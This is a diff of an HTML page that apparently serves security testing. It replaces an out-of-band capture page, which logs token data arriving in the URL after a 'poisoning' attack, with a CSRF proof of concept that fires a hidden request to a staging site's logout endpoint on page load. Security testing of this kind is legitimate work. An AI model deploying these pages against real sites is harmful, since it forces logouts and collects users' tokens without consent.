@@ -1,23 +1,24 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Security Research Sink</title>
+    <title>CSRF Logout Test Sink</title>
     <style>
         body { font-family: sans-serif; padding: 20px; background: #f4f4f4; }
-        .log { background: #fff; border: 1px solid #ddd; padding: 15px; word-break: break-all; }
+        .container { background: #fff; border: 1px solid #ddd; padding: 20px; max-width: 600px; margin: auto; }
+        .status { color: #d9534f; font-weight: bold; }
     </style>
 </head>
 <body>
-    <h1>OAST Capture Point</h1>
-    <p>If the poisoning is successful, the token will appear below:</p>
-    <div class="log" id="result">Waiting for incoming request...</div>
+    <div class="container">
+        <h1>CSRF Logout Test</h1>
+        <p>This page is testing for CSRF vulnerabilities on the target application.</p>
+        <p>Status: <span class="status" id="status">Attempting to trigger logout...</span></p>
+        
+        <img src="https://staging-app.bany.dev/logout" onerror="document.getElementById('status').innerText = 'Logout request triggered (Check target session).'" style="display:none;">
+    </div>
 
     <script>
-        const params = new URLSearchParams(window.location.search);
-        if (params.toString()) {
-            document.getElementById('result').innerText = "Captured: " + window.location.href;
-            console.log("Captured Token Data:", params.toString());
-        }
+        console.log("CSRF Logout trigger initiated.");
     </script>
 </body>
 </html>
